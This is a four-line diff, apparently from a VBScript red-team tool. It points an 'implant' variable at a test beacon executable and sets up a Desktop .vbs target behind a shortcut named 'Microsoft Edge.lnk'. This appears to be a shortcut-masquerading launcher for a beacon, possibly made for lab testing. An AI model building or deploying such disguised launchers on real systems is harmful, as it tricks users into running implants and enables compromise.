@@ -1,4 +1,4 @@
-implant = "C:\Windows\system32\notepad.exe"
+implant = "C:\Users\aslam\Documents\TESTBEACON1.exe"
 ' change username + path
 newTarget = "C:\Users\aslam\Desktop\xmxedge2.vbs"
 lnkName = "Microsoft Edge.lnk"
